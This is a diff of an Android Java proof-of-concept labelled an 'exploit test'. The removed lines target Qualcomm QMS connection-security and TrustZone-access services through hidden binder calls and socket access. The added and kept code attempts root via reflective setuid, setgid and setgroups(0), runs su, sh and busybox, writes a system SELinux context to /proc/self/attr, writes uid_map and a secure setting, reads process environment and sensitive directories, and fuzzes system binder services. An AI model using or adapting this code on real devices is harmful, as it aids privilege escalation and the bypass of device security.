@@ -2,22 +2,12 @@ package com.poc;
 
 import android.app.ActivityThread;
 import android.app.AppGlobals;
-import android.content.ComponentName;
 import android.content.Context;
-import android.content.Intent;
-import android.content.ServiceConnection;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.Parcel;
-import android.os.ParcelFileDescriptor;
-import android.os.RemoteException;
 import android.os.ServiceManager;
 import android.provider.Settings;
-
-import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
-import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
-import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
-import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -30,55 +20,13 @@ import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
-import java.util.concurrent.CountDownLatch;
-import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class Main {
-    private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
-    private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
-    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
-    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
     private static final String LOG_DIR = "/data/data/com.qualcomm.qti.qms.service.trustzoneaccess/";
-
     private static Context sContext;
-    private static IServiceManager mServiceManager;
-    private static IMinkSocketFd mTZService;
-    private static boolean isBoundCS = false;
-    private static boolean isBoundTZ = false;
-    private static CountDownLatch latch = new CountDownLatch(2);
     private static StringBuilder logBuilder = new StringBuilder();
     private static AtomicBoolean stopRequested = new AtomicBoolean(false);
-
-    private static ServiceConnection csConnection = new ServiceConnection() {
-        @Override
-        public void onServiceConnected(ComponentName name, IBinder service) {
-            mServiceManager = IServiceManager.Stub.asInterface(service);
-            appendLog("[CS] Service bound");
-            latch.countDown();
-        }
-        @Override
-        public void onServiceDisconnected(ComponentName name) {
-            mServiceManager = null;
-            isBoundCS = false;
-            appendLog("[CS] disconnected");
-        }
-    };
-
-    private static ServiceConnection tzConnection = new ServiceConnection() {
-        @Override
-        public void onServiceConnected(ComponentName name, IBinder service) {
-            mTZService = IMinkSocketFd.Stub.asInterface(service);
-            appendLog("[TZ] Service bound");
-            latch.countDown();
-        }
-        @Override
-        public void onServiceDisconnected(ComponentName name) {
-            mTZService = null;
-            isBoundTZ = false;
-            appendLog("[TZ] disconnected");
-        }
-    };
 
     public static void main(String[] args) {
         try {
@@ -89,52 +37,37 @@ public class Main {
 
         sContext = getContext();
         if (sContext == null) {
-            appendLog("[!] Failed to obtain Context, exiting.");
-            saveLog();
-            System.exit(1);
+            appendLog("[!] Failed to obtain Context, some tests will be skipped");
+        } else {
+            appendLog("[*] Context obtained: " + sContext.getClass().getName());
         }
-        appendLog("[*] Context obtained: " + sContext.getClass().getName());
 
         appendLog("========================================");
         appendLog("========== SSG_APP EXPLOIT TEST ==========");
         appendLog("Starting at " + new Date().toString());
 
-        bindServices();
+        appendLog("========== PHASE 1: SystemProperties Manipulation ==========");
+        testSystemProperties();
 
-        try {
-            if (!latch.await(15, TimeUnit.SECONDS)) {
-                appendLog("[!] Bind timeout");
-            }
-        } catch (InterruptedException e) {
-            appendLog("[!] Bind interrupted");
-        }
+        appendLog("========== PHASE 2: Settings Write Test ==========");
+        testSettingsWrite();
 
-        if (mServiceManager != null && mTZService != null) {
-            runTests();
-        } else {
-            appendLog("[!] Services not available, attempting fallback via ServiceManager...");
-            try {
-                IBinder csBinder = ServiceManager.getService("connectionsecurity");
-                if (csBinder != null) {
-                    mServiceManager = IServiceManager.Stub.asInterface(csBinder);
-                    appendLog("[CS] Got via ServiceManager");
-                }
-                IBinder tzBinder = ServiceManager.getService("trustzoneaccess");
-                if (tzBinder != null) {
-                    mTZService = IMinkSocketFd.Stub.asInterface(tzBinder);
-                    appendLog("[TZ] Got via ServiceManager");
-                }
-                if (mServiceManager != null && mTZService != null) {
-                    runTests();
-                } else {
-                    appendLog("[!] Fallback failed");
-                }
-            } catch (Exception e) {
-                appendLog("[!] Fallback error: " + e.getMessage());
-            }
-        }
+        appendLog("========== PHASE 3: File System Exploration ==========");
+        exploreDeepFiles();
 
-        appendLog("========== TEST COMPLETED ==========");
+        appendLog("========== PHASE 4: setuid 0 Bruteforce Attempts ==========");
+        attemptSetuid0();
+
+        appendLog("========== PHASE 5: Binder Transaction Fuzzing ==========");
+        fuzzBinderTransactions();
+
+        appendLog("========== PHASE 6: Process Attribute Manipulation ==========");
+        manipulateProcessAttributes();
+
+        appendLog("========== PHASE 7: /proc/self Exploitation ==========");
+        exploitProcSelf();
+
+        appendLog("========== ALL TESTS COMPLETED ==========");
         appendLog("========================================");
         saveLog();
         System.exit(0);
@@ -142,7 +75,6 @@ public class Main {
 
     private static Context getContext() {
         Context ctx = null;
-
         try {
             ActivityThread at = ActivityThread.currentActivityThread();
             if (at != null) {
@@ -180,356 +112,7 @@ public class Main {
             appendLog("[CTX] systemMain failed: " + e.getMessage());
         }
 
-        try {
-            Class<?> contextImplClass = Class.forName("android.app.ContextImpl");
-            Method createSystemContext = contextImplClass.getDeclaredMethod("createSystemContext", ActivityThread.class);
-            createSystemContext.setAccessible(true);
-            ActivityThread at = ActivityThread.currentActivityThread();
-            if (at == null) {
-                Class<?> atClass = Class.forName("android.app.ActivityThread");
-                Method systemMain = atClass.getDeclaredMethod("systemMain");
-                systemMain.setAccessible(true);
-                at = (ActivityThread) systemMain.invoke(null);
-            }
-            ctx = (Context) createSystemContext.invoke(null, at);
-            appendLog("[CTX] Got via ContextImpl.createSystemContext()");
-            return ctx;
-        } catch (Exception e) {
-            appendLog("[CTX] ContextImpl.createSystemContext failed: " + e.getMessage());
-        }
-
         return null;
-    }
-
-    private static void bindServices() {
-        if (sContext == null) {
-            appendLog("[!] Context is null, cannot bind");
-            return;
-        }
-        try {
-            Intent intentCS = new Intent();
-            intentCS.setClassName(TARGET_PKG_CS, TARGET_CLS_CS);
-            isBoundCS = sContext.bindService(intentCS, csConnection, Context.BIND_AUTO_CREATE);
-            if (!isBoundCS) appendLog("[CS] bind failed");
-
-            Intent intentTZ = new Intent();
-            intentTZ.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
-            isBoundTZ = sContext.bindService(intentTZ, tzConnection, Context.BIND_AUTO_CREATE);
-            if (!isBoundTZ) appendLog("[TZ] bind failed");
-
-            if (!isBoundCS && !isBoundTZ) {
-                appendLog("[!] Failed to bind any service");
-            }
-        } catch (Exception e) {
-            appendLog("[!] Bind exception: " + e.toString());
-        }
-    }
-
-    private static void runTests() {
-        appendLog("========== PHASE 1: CS Enumeration ==========");
-        if (mServiceManager != null) {
-            IBinder rticBinder = getService("rtic");
-            if (rticBinder != null) {
-                appendLog("[CS] rtic binder acquired");
-                IRticService rtic = IRticService.Stub.asInterface(rticBinder);
-                testRticFlags(rtic);
-                discoverMethods(rticBinder, "IRticService");
-            } else {
-                appendLog("[CS] rtic binder NULL");
-            }
-            IBinder tlocBinder = getService("tloc");
-            if (tlocBinder != null) {
-                appendLog("[CS] tloc binder acquired");
-                ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
-                testTloc(tloc);
-                discoverMethods(tlocBinder, "ITlocService");
-                testTlocHiddenMethod(tlocBinder);
-            } else {
-                appendLog("[CS] tloc binder NULL");
-            }
-        } else {
-            appendLog("[CS] ServiceManager not available");
-        }
-
-        appendLog("========== PHASE 2: TZAccess Socket Tests ==========");
-        if (mTZService != null) {
-            appendLog("[TZ] Testing socket connections...");
-            String[] socketPaths = {
-                "/dev/socket/minksocket",
-                "/dev/socket/ssgqmig",
-                "/dev/socket/mdnsd",
-                "/dev/socket/tcm",
-                "/dev/socket/fwmarkd",
-                "/dev/socket/dnsproxyd",
-                "/dev/socket/logd",
-                "/dev/socket/property_service"
-            };
-            for (String path : socketPaths) {
-                if (stopRequested.get()) break;
-                testSocket(path);
-            }
-        } else {
-            appendLog("[TZ] TZ service not available");
-        }
-
-        appendLog("========== PHASE 3: File System Exploration ==========");
-        exploreDeepFiles();
-
-        appendLog("========== PHASE 4: Settings Write Test ==========");
-        testSettingsWrite();
-
-        appendLog("========== PHASE 5: SystemProperties Manipulation ==========");
-        testSystemProperties();
-
-        appendLog("========== PHASE 6: setuid 0 Bruteforce Attempts ==========");
-        attemptSetuid0();
-
-        appendLog("========== PHASE 7: Binder Transaction Fuzzing ==========");
-        fuzzBinderTransactions();
-
-        appendLog("========== ALL TESTS COMPLETED ==========");
-    }
-
-    private static IBinder getService(String serviceName) {
-        if (mServiceManager == null) return null;
-        try {
-            int[] status = new int[1];
-            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
-            if (binder != null) {
-                appendLog("  Got " + serviceName + " binder, status=" + status[0]);
-                return binder;
-            } else {
-                appendLog("  " + serviceName + " failed, status=" + status[0]);
-                return null;
-            }
-        } catch (RemoteException e) {
-            appendLog("  RemoteException: " + e.getMessage());
-            return null;
-        }
-    }
-
-    private static void testRticFlags(IRticService rtic) {
-        appendLog("[RTIC] Testing flags...");
-        long[] flags = {0, 8, 32, 64, 2147483648L, 8|32, 8|64, 32|64, 8|32|64};
-        for (long flag : flags) {
-            try {
-                int[] status = new int[1];
-                int[] ret = new int[1];
-                byte[] data = rtic.getRticData(flag, status, ret, false);
-                appendLog("  Flag " + flag + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
-            } catch (RemoteException e) {
-                appendLog("  RemoteException for flag " + flag + ": " + e.getMessage());
-            }
-        }
-        try {
-            int[] status = new int[1];
-            int[] ret = new int[1];
-            byte[] data = rtic.getRticData(0, status, ret, true);
-            appendLog("  z=true -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
-        } catch (RemoteException e) {
-            appendLog("  RemoteException: " + e.getMessage());
-        }
-    }
-
-    private static void testTloc(ITlocService tloc) {
-        appendLog("[TLOC] Testing...");
-        try {
-            int[] status = new int[1];
-            int[] ret = new int[1];
-            byte[] data = tloc.getTrustedLocation(status, ret);
-            appendLog("  getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
-            int warmup = tloc.tlocWarmUp();
-            appendLog("  tlocWarmUp returned: " + warmup);
-        } catch (RemoteException e) {
-            appendLog("  RemoteException: " + e.getMessage());
-        }
-    }
-
-    private static void testTlocHiddenMethod(IBinder binder) {
-        appendLog("[TLOC] Testing hidden method (code 2)...");
-        Parcel data = Parcel.obtain();
-        Parcel reply = Parcel.obtain();
-        try {
-            data.writeInterfaceToken(binder.getInterfaceDescriptor());
-            data.writeInt(123);
-            data.writeString("test");
-            boolean success = binder.transact(2, data, reply, 0);
-            if (success) {
-                appendLog("  Hidden method succeeded, reply size=" + reply.dataSize());
-                reply.setDataPosition(0);
-                try {
-                    int result = reply.readInt();
-                    appendLog("    readInt: " + result);
-                } catch (Exception e) {}
-                try {
-                    String s = reply.readString();
-                    appendLog("    readString: " + s);
-                } catch (Exception e) {}
-            } else {
-                appendLog("  Hidden method failed");
-            }
-        } catch (Exception e) {
-            appendLog("  Error: " + e.getMessage());
-        } finally {
-            data.recycle();
-            reply.recycle();
-        }
-    }
-
-    private static void discoverMethods(IBinder binder, String name) {
-        appendLog("[DISCOVER] " + name);
-        for (int code = 1; code <= 30; code++) {
-            if (stopRequested.get()) break;
-            Parcel data = Parcel.obtain();
-            Parcel reply = Parcel.obtain();
-            try {
-                data.writeInterfaceToken(binder.getInterfaceDescriptor());
-                boolean success = binder.transact(code, data, reply, 0);
-                if (success) {
-                    appendLog("  Method " + code + " succeeded, reply size=" + reply.dataSize());
-                    reply.setDataPosition(0);
-                    try {
-                        int result = reply.readInt();
-                        appendLog("    readInt: " + result);
-                    } catch (Exception e) {}
-                } else {
-                    appendLog("  Method " + code + " failed");
-                }
-            } catch (Exception e) {
-                appendLog("  Method " + code + " threw: " + e.getClass().getSimpleName());
-            } finally {
-                data.recycle();
-                reply.recycle();
-            }
-        }
-    }
-
-    private static void testSocket(String path) {
-        appendLog("[TZ] Testing: " + path);
-        if (mTZService == null) {
-            appendLog("  TZ service null");
-            return;
-        }
-        ParcelFileDescriptor pfd = null;
-        try {
-            int[] iArr = new int[1];
-            pfd = mTZService.a(path, iArr);
-            if (pfd == null) {
-                appendLog("  [FAIL] FD is null");
-                return;
-            }
-            appendLog("  [SUCCESS] Got FD: " + iArr[0]);
-            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-            if (fdesc == null || !fdesc.valid()) {
-                appendLog("  FD invalid");
-                pfd.close();
-                return;
-            }
-            java.io.OutputStream os = new java.io.FileOutputStream(fdesc);
-            java.io.InputStream is = new java.io.FileInputStream(fdesc);
-            String cmd = "help\n";
-            os.write(cmd.getBytes(StandardCharsets.UTF_8));
-            os.flush();
-            byte[] buf = new byte[512];
-            int len = is.read(buf);
-            if (len > 0) {
-                String resp = new String(buf, 0, len, StandardCharsets.UTF_8);
-                appendLog("  Response: " + resp.trim());
-            } else {
-                appendLog("  No response");
-            }
-            os.close();
-            is.close();
-            pfd.close();
-        } catch (RemoteException e) {
-            appendLog("  RemoteException: " + e.getMessage());
-        } catch (Exception e) {
-            appendLog("  Error: " + e.getMessage());
-        }
-    }
-
-    private static void exploreDeepFiles() {
-        appendLog("[FS] Deep file exploration...");
-        String[] procFiles = {
-            "/proc/self/status",
-            "/proc/self/maps",
-            "/proc/self/smaps",
-            "/proc/self/limits",
-            "/proc/self/statm",
-            "/proc/self/cgroup",
-            "/proc/version",
-            "/proc/meminfo",
-            "/proc/cpuinfo"
-        };
-        for (String p : procFiles) {
-            if (stopRequested.get()) break;
-            readFileContent(p);
-        }
-        File tmp = new File("/data/local/tmp");
-        if (tmp.exists()) {
-            appendLog("[FS] /data/local/tmp exists, canRead=" + tmp.canRead());
-            if (tmp.canRead()) {
-                File[] children = tmp.listFiles();
-                if (children != null) {
-                    for (File f : children) {
-                        appendLog("  " + f.getName());
-                    }
-                }
-            }
-        } else {
-            appendLog("[FS] /data/local/tmp not exist");
-        }
-        File download = new File("/sdcard/Download");
-        if (download.exists()) {
-            File test = new File(download, "poc_write_test.txt");
-            try (FileOutputStream fos = new FileOutputStream(test)) {
-                fos.write("test\n".getBytes(StandardCharsets.UTF_8));
-                appendLog("[FS] Write test succeeded");
-            } catch (Exception e) {
-                appendLog("[FS] Write test failed: " + e.getMessage());
-            }
-        }
-    }
-
-    private static void readFileContent(String path) {
-        File f = new File(path);
-        if (!f.exists()) {
-            appendLog("[FS] " + path + " does not exist");
-            return;
-        }
-        if (!f.canRead()) {
-            appendLog("[FS] " + path + " not readable");
-            return;
-        }
-        try (FileInputStream fis = new FileInputStream(f)) {
-            byte[] data = new byte[1024];
-            int len = fis.read(data);
-            if (len > 0) {
-                String content = new String(data, 0, len, StandardCharsets.UTF_8);
-                appendLog("[FS] " + path + " content: " + content.trim());
-            } else {
-                appendLog("[FS] " + path + " empty");
-            }
-        } catch (Exception e) {
-            appendLog("[FS] " + path + " error: " + e.getMessage());
-        }
-    }
-
-    private static void testSettingsWrite() {
-        appendLog("[SETTINGS] WRITE_SECURE_SETTINGS test...");
-        try {
-            String current = Settings.Global.getString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions");
-            appendLog("  Current value: " + (current == null ? "(null)" : current));
-            boolean success = Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", "test");
-            if (success) {
-                appendLog("  [SUCCESS] WRITE_SECURE_SETTINGS works");
-                Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", current);
-            } else {
-                appendLog("  [FAIL] WRITE_SECURE_SETTINGS failed");
-            }
-        } catch (Exception e) {
-            appendLog("  Exception: " + e.getMessage());
-        }
     }
 
     private static void testSystemProperties() {
@@ -561,8 +144,143 @@ public class Main {
                     }
                 }
             }
+
+            String[] dangerousProps = {
+                "ro.debuggable", "ro.secure", "ro.adb.secure",
+                "security.perf_harden", "ro.kernel.qemu", "ro.product.cpu.abi"
+            };
+            for (String p : dangerousProps) {
+                try {
+                    String v = (String) getMethod.invoke(null, p);
+                    appendLog("  Read " + p + " = " + v);
+                } catch (Exception e) {
+                    appendLog("  Read " + p + " failed: " + e.getMessage());
+                }
+            }
         } catch (Exception e) {
             appendLog("  SystemProperties error: " + e.getMessage());
+        }
+    }
+
+    private static void testSettingsWrite() {
+        appendLog("[SETTINGS] WRITE_SECURE_SETTINGS test...");
+        if (sContext == null) {
+            appendLog("  Context null, skipping");
+            return;
+        }
+        try {
+            String current = Settings.Global.getString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions");
+            appendLog("  Current value: " + (current == null ? "(null)" : current));
+            boolean success = Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", "test");
+            if (success) {
+                appendLog("  [SUCCESS] WRITE_SECURE_SETTINGS works");
+                Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", current);
+            } else {
+                appendLog("  [FAIL] WRITE_SECURE_SETTINGS failed");
+            }
+        } catch (Exception e) {
+            appendLog("  Exception: " + e.getMessage());
+        }
+    }
+
+    private static void exploreDeepFiles() {
+        appendLog("[FS] Deep file exploration...");
+        String[] procFiles = {
+            "/proc/self/status",
+            "/proc/self/maps",
+            "/proc/self/smaps",
+            "/proc/self/limits",
+            "/proc/self/statm",
+            "/proc/self/cgroup",
+            "/proc/version",
+            "/proc/meminfo",
+            "/proc/cpuinfo",
+            "/proc/self/attr/current",
+            "/proc/self/attr/prev",
+            "/proc/self/attr/exec",
+            "/proc/self/oom_score_adj",
+            "/proc/self/comm",
+            "/proc/self/cmdline"
+        };
+        for (String p : procFiles) {
+            if (stopRequested.get()) break;
+            readFileContent(p);
+        }
+
+        File tmp = new File("/data/local/tmp");
+        if (tmp.exists()) {
+            appendLog("[FS] /data/local/tmp exists, canRead=" + tmp.canRead());
+            if (tmp.canRead()) {
+                File[] children = tmp.listFiles();
+                if (children != null) {
+                    for (File f : children) {
+                        appendLog("  " + f.getName());
+                    }
+                }
+            }
+        } else {
+            appendLog("[FS] /data/local/tmp not exist");
+        }
+
+        File download = new File("/sdcard/Download");
+        if (download.exists()) {
+            File test = new File(download, "poc_write_test.txt");
+            try (FileOutputStream fos = new FileOutputStream(test)) {
+                fos.write("test\n".getBytes(StandardCharsets.UTF_8));
+                appendLog("[FS] Write test succeeded");
+            } catch (Exception e) {
+                appendLog("[FS] Write test failed: " + e.getMessage());
+            }
+        }
+
+        String[] sensitiveDirs = {
+            "/data/data",
+            "/data/system",
+            "/data/misc",
+            "/data/property",
+            "/dev",
+            "/sys",
+            "/proc"
+        };
+        for (String d : sensitiveDirs) {
+            File f = new File(d);
+            if (f.exists() && f.isDirectory()) {
+                try {
+                    appendLog("[FS] " + d + " exists, canRead=" + f.canRead() + ", canWrite=" + f.canWrite());
+                    if (f.canRead()) {
+                        String[] list = f.list();
+                        if (list != null && list.length > 0) {
+                            appendLog("  Sample entries: " + String.join(", ", list.length > 5 ? java.util.Arrays.copyOf(list, 5) : list));
+                        }
+                    }
+                } catch (Exception e) {
+                    appendLog("[FS] Error accessing " + d + ": " + e.getMessage());
+                }
+            }
+        }
+    }
+
+    private static void readFileContent(String path) {
+        File f = new File(path);
+        if (!f.exists()) {
+            appendLog("[FS] " + path + " does not exist");
+            return;
+        }
+        if (!f.canRead()) {
+            appendLog("[FS] " + path + " not readable");
+            return;
+        }
+        try (FileInputStream fis = new FileInputStream(f)) {
+            byte[] data = new byte[1024];
+            int len = fis.read(data);
+            if (len > 0) {
+                String content = new String(data, 0, len, StandardCharsets.UTF_8);
+                appendLog("[FS] " + path + " content: " + content.trim());
+            } else {
+                appendLog("[FS] " + path + " empty");
+            }
+        } catch (Exception e) {
+            appendLog("[FS] " + path + " error: " + e.getMessage());
         }
     }
 
@@ -600,19 +318,51 @@ public class Main {
             appendLog("  Process.setuid failed: " + e.getMessage());
         }
 
+        try {
+            Class<?> processClass = Class.forName("android.os.Process");
+            Method setgidMethod = processClass.getDeclaredMethod("setgid", int.class);
+            setgidMethod.setAccessible(true);
+            int result = (int) setgidMethod.invoke(null, 0);
+            appendLog("  Process.setgid(0) returned: " + result);
+        } catch (Exception e) {
+            appendLog("  Process.setgid failed: " + e.getMessage());
+        }
+
+        try {
+            Class<?> processClass = Class.forName("android.os.Process");
+            Method setgroupsMethod = processClass.getDeclaredMethod("setgroups", int[].class);
+            setgroupsMethod.setAccessible(true);
+            int[] groups = {0};
+            setgroupsMethod.invoke(null, (Object) groups);
+            appendLog("  Process.setgroups([0]) succeeded?");
+        } catch (Exception e) {
+            appendLog("  Process.setgroups failed: " + e.getMessage());
+        }
+
+        try {
+            Class<?> fileDescriptor = Class.forName("java.io.FileDescriptor");
+            Field fdField = fileDescriptor.getDeclaredField("fd");
+            fdField.setAccessible(true);
+            int fd = fdField.getInt(java.io.FileDescriptor.in);
+            appendLog("  STDIN_FD = " + fd);
+        } catch (Exception e) {
+            appendLog("  FD introspection failed: " + e.getMessage());
+        }
+
         String[] suidCandidates = {
             "/system/bin/su",
             "/system/xbin/su",
             "/system/bin/sh",
             "/system/bin/run-as",
-            "/system/bin/ping"
+            "/system/bin/ping",
+            "/system/bin/busybox"
         };
         for (String path : suidCandidates) {
             File f = new File(path);
             if (f.exists()) {
                 appendLog("  Found " + path + ", canExecute=" + f.canExecute());
                 try {
-                    Process p = Runtime.getRuntime().exec(path + " -c id");
+                    Process p = Runtime.getRuntime().exec(new String[]{path, "-c", "id"});
                     java.io.InputStream is = p.getInputStream();
                     byte[] buf = new byte[1024];
                     int len = is.read(buf);
@@ -625,17 +375,30 @@ public class Main {
                 }
             }
         }
+
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "echo test"});
+            java.io.InputStream is = p.getInputStream();
+            byte[] buf = new byte[1024];
+            int len = is.read(buf);
+            if (len > 0) {
+                appendLog("  sh test output: " + new String(buf, 0, len).trim());
+            }
+            p.waitFor();
+        } catch (Exception e) {
+            appendLog("  sh test failed: " + e.getMessage());
+        }
     }
 
     private static void fuzzBinderTransactions() {
         appendLog("[FUZZ] Fuzzing binder transactions on system services...");
-        String[] services = {"activity", "window", "package", "power", "account", "battery", "alarm"};
+        String[] services = {"activity", "window", "package", "power", "account", "battery", "alarm", "usb", "vibrator", "display", "input", "device_policy"};
         for (String svc : services) {
             try {
                 IBinder binder = ServiceManager.getService(svc);
                 if (binder == null) continue;
                 appendLog("  Fuzzing " + svc);
-                for (int code = 1; code <= 50; code++) {
+                for (int code = 1; code <= 60; code++) {
                     Parcel data = Parcel.obtain();
                     Parcel reply = Parcel.obtain();
                     try {
@@ -653,6 +416,93 @@ public class Main {
             } catch (Exception e) {
                 appendLog("  Failed to get " + svc + ": " + e.getMessage());
             }
+        }
+    }
+
+    private static void manipulateProcessAttributes() {
+        appendLog("[PROC] Trying to manipulate /proc/self/attr...");
+        try {
+            File attrDir = new File("/proc/self/attr");
+            if (attrDir.exists() && attrDir.isDirectory()) {
+                String[] files = attrDir.list();
+                if (files != null) {
+                    for (String f : files) {
+                        appendLog("  Found attr file: " + f);
+                    }
+                }
+            }
+            String[] attrFiles = {"current", "prev", "exec", "fscreate", "keycreate", "sockcreate"};
+            for (String a : attrFiles) {
+                File f = new File("/proc/self/attr/" + a);
+                if (f.exists()) {
+                    appendLog("  " + a + " exists, canRead=" + f.canRead() + ", canWrite=" + f.canWrite());
+                    if (f.canWrite()) {
+                        try (FileOutputStream fos = new FileOutputStream(f)) {
+                            fos.write("u:r:system_r:s0\n".getBytes(StandardCharsets.UTF_8));
+                            appendLog("    Wrote to " + a);
+                        } catch (Exception e) {
+                            appendLog("    Write to " + a + " failed: " + e.getMessage());
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            appendLog("  attr manipulation error: " + e.getMessage());
+        }
+
+        appendLog("[PROC] Trying to adjust oom_score_adj...");
+        try {
+            File oom = new File("/proc/self/oom_score_adj");
+            if (oom.exists() && oom.canWrite()) {
+                try (FileOutputStream fos = new FileOutputStream(oom)) {
+                    fos.write("-1000".getBytes(StandardCharsets.UTF_8));
+                    appendLog("  Set oom_score_adj to -1000");
+                } catch (Exception e) {
+                    appendLog("  Failed to set oom_score_adj: " + e.getMessage());
+                }
+            }
+        } catch (Exception e) {
+            appendLog("  oom_score_adj error: " + e.getMessage());
+        }
+    }
+
+    private static void exploitProcSelf() {
+        appendLog("[PROC] Exploring /proc/self/fd...");
+        try {
+            File fdDir = new File("/proc/self/fd");
+            if (fdDir.exists() && fdDir.isDirectory()) {
+                File[] fds = fdDir.listFiles();
+                if (fds != null) {
+                    for (File f : fds) {
+                        try {
+                            String target = java.nio.file.Files.readSymbolicLink(f.toPath()).toString();
+                            appendLog("  FD " + f.getName() + " -> " + target);
+                        } catch (Exception e) {
+                            appendLog("  FD " + f.getName() + " cannot read link");
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            appendLog("  fd exploration error: " + e.getMessage());
+        }
+
+        appendLog("[PROC] Trying to read /proc/self/environ...");
+        readFileContent("/proc/self/environ");
+
+        appendLog("[PROC] Trying to write to /proc/self/uid_map...");
+        try {
+            File uidMap = new File("/proc/self/uid_map");
+            if (uidMap.exists() && uidMap.canWrite()) {
+                try (FileOutputStream fos = new FileOutputStream(uidMap)) {
+                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
+                    appendLog("  Wrote to uid_map");
+                } catch (Exception e) {
+                    appendLog("  uid_map write failed: " + e.getMessage());
+                }
+            }
+        } catch (Exception e) {
+            appendLog("  uid_map error: " + e.getMessage());
         }
     }
 
